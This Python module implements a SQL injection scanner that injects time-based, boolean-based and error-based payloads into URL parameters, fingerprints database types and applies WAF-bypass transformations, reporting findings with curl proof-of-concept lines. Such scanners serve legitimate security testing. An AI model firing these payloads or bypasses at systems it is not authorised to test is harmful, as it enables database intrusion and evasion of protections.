"""
Intensive SQL Injection Detection Module
Advanced techniques: Blind SQLi, Time-based, Database fingerprinting, WAF bypass
"""

import requests
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.payload_loader import payload_loader


class IntensiveSQLiScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.findings = []
        self.detected_db = None
        
        # Database fingerprinting payloads
        self.db_fingerprints = {
            'MySQL': ['@@version', 'version()', 'SLEEP(', 'BENCHMARK('],
            'PostgreSQL': ['version()', 'pg_sleep(', '::'],
            'MSSQL': ['@@version', 'WAITFOR DELAY', 'xp_'],
            'Oracle': ['DBMS_PIPE.RECEIVE_MESSAGE', 'UTL_INADDR'],
            'SQLite': ['sqlite_version()', 'LIKE']
        }
        
        # Time-based payloads (5 second delay)
        self.time_payloads = {
            'MySQL': ["' AND SLEEP(5)--", "' OR SLEEP(5)--"],
            'PostgreSQL': ["' AND pg_sleep(5)--", "'; SELECT pg_sleep(5)--"],
            'MSSQL': ["'; WAITFOR DELAY '00:00:05'--", "' WAITFOR DELAY '00:00:05'--"],
            'Oracle': ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--"],
        }
        
        # Boolean-based blind payloads
        self.boolean_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),  # True vs False
            ("' OR '1'='1", "' AND '1'='2"),   # Always true vs Always false
            ("1' AND '1'='1", "1' AND '1'='2"),
        ]
        
        # WAF bypass variations
        self.waf_bypass_techniques = [
            lambda p: p,  # Original
            lambda p: p.replace(' ', '/**/'),  # Comment-based
            lambda p: p.upper(),  # Case variation
            lambda p: p.replace('SELECT', 'SeLeCt'),  # Mixed case
            lambda p: p.replace("'", "\""),  # Quote swap
            lambda p: p + chr(0),  # Null byte
        ]
        
        # Load comprehensive payloads
        self.basic_payloads = payload_loader.load_payloads('sqli.txt')
        
    def fingerprint_database(self, url: str, param: str) -> Optional[str]:
        """Detect database type"""
        for db_type, signatures in self.db_fingerprints.items():
            for signature in signatures:
                test_payload = f"' AND {signature}--"
                test_url = self._build_url(url, param, test_payload)
                
                try:
                    response = requests.get(test_url, timeout=5)
                    if response.status_code != 500:  # No error = might be valid
                        return db_type
                except:
                    continue
        return None
    
    def test_time_based_blind(self, url: str, param: str) -> List[Dict]:
        """Test for time-based blind SQL injection"""
        findings = []
        
        # Try to detect database first
        db_type = self.detected_db or self.fingerprint_database(url, param)
        if db_type:
            self.detected_db = db_type
        
        # Test time-based payloads
        payloads_to_test = []
        if db_type and db_type in self.time_payloads:
            payloads_to_test = self.time_payloads[db_type]
        else:
            # Test all if DB unknown
            for db_payloads in self.time_payloads.values():
                payloads_to_test.extend(db_payloads[:1])  # One from each
        
        for payload in payloads_to_test:
            test_url = self._build_url(url, param, payload)
            
            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=15)
                elapsed = time.time() - start_time
                
                # If response took ~5 seconds, it's vulnerable
                if 4.5 <= elapsed <= 6.5:
                    findings.append({
                        "name": "SQL Injection (Time-based Blind)",
                        "severity": "critical",
                        "owasp_category": "A03:2021",
                        "url": url,
                        "parameter": param,
                        "confidence": 98,
                        "technique": f"Time-based blind ({db_type or 'Unknown DB'})",
                        "evidence": {
                            "payload": payload,
                            "response_time": f"{elapsed:.2f}s",
                            "expected_delay": "5s"
                        },
                        "poc": f"curl '{test_url}'",
                        "remediation": "Use parameterized queries. Never concatenate user input into SQL."
                    })
                    return findings  # Found it, no need to test more
            except requests.exceptions.Timeout:
                # Timeout might indicate successful injection
                findings.append({
                    "name": "SQL Injection (Time-based Blind - High Confidence)",
                    "severity": "critical",
                    "owasp_category": "A03:2021",
                    "url": url,
                    "parameter": param,
                    "confidence": 95,
                    "technique": f"Time-based blind - Timeout ({db_type or 'Unknown DB'})",
                    "evidence": {"payload": payload, "result": "Request timeout (>15s)"},
                    "poc": f"curl '{test_url}'",
                    "remediation": "Use parameterized queries"
                })
                return findings
            except:
                continue
        
        return findings
    
    def test_boolean_based_blind(self, url: str, param: str) -> List[Dict]:
        """Test for boolean-based blind SQL injection"""
        findings = []
        
        try:
            # Get baseline
            baseline_url = self._build_url(url, param, "1")
            baseline_response = requests.get(baseline_url, timeout=10)
            baseline_length = len(baseline_response.text)
            baseline_status = baseline_response.status_code
            
            for true_payload, false_payload in self.boolean_payloads:
                # Test TRUE condition
                true_url = self._build_url(url, param, true_payload)
                true_response = requests.get(true_url, timeout=10)
                
                # Test FALSE condition
                false_url = self._build_url(url, param, false_payload)
                false_response = requests.get(false_url, timeout=10)
                
                true_len = len(true_response.text)
                false_len = len(false_response.text)
                
                # If TRUE gives different result than FALSE, it's vulnerable
                if abs(true_len - false_len) > 100:
                    findings.append({
                        "name": "SQL Injection (Boolean-based Blind)",
                        "severity": "critical",
                        "owasp_category": "A03:2021",
                        "url": url,
                        "parameter": param,
                        "confidence": 92,
                        "technique": "Boolean-based blind",
                        "evidence": {
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "true_length": true_len,
                            "false_length": false_len,
                            "difference": abs(true_len - false_len)
                        },
                        "poc": f"True: curl '{true_url}'\nFalse: curl '{false_url}'",
                        "remediation": "Use parameterized queries"
                    })
                    return findings  # Found one, that's enough
        except:
            pass
        
        return findings
    
    def test_with_waf_bypass(self, url: str, param: str, base_payload: str) -> List[Dict]:
        """Test payload with WAF bypass techniques"""
        findings = []
        
        for bypass_func in self.waf_bypass_techniques:
            payload = bypass_func(base_payload)
            test_url = self._build_url(url, param, payload)
            
            try:
                response = requests.get(test_url, timeout=10)
                
                # Check for SQL errors
                error_patterns = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite"]
                for pattern in error_patterns:
                    if pattern.lower() in response.text.lower():
                        findings.append({
                            "name": "SQL Injection (Error-based + WAF Bypass)",
                            "severity": "critical",
                            "owasp_category": "A03:2021",
                            "url": url,
                            "parameter": param,
                            "confidence": 95,
                            "technique": f"Error-based with bypass technique",
                            "evidence": {
                                "payload": payload,
                                "original_payload": base_payload,
                                "error_pattern": pattern,
                                "bypass_technique": bypass_func.__name__ if hasattr(bypass_func, '__name__') else "transformation"
                            },
                            "poc": f"curl '{test_url}'",
                            "remediation": "Use parameterized queries. WAF detected but bypassed."
                        })
                        return findings
            except:
                continue
        
        return findings
    
    def _build_url(self, url: str, param: str, payload: str) -> str:
        """Build test URL with payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
    
    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Comprehensive SQL injection scan"""
        all_findings = []
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                continue
            
            for param in params.keys():
                # 1. Time-based blind
                findings = self.test_time_based_blind(url, param)
                all_findings.extend(findings)
                if findings:
                    continue  # Already found via time-based
                
                # 2. Boolean-based blind
                findings = self.test_boolean_based_blind(url, param)
                all_findings.extend(findings)
                if findings:
                    continue
                
                # 3. Error-based with WAF bypass
                for base_payload in self.basic_payloads[:5]:
                    findings = self.test_with_waf_bypass(url, param, base_payload)
                    all_findings.extend(findings)
                    if findings:
                        break
        
        return all_findings
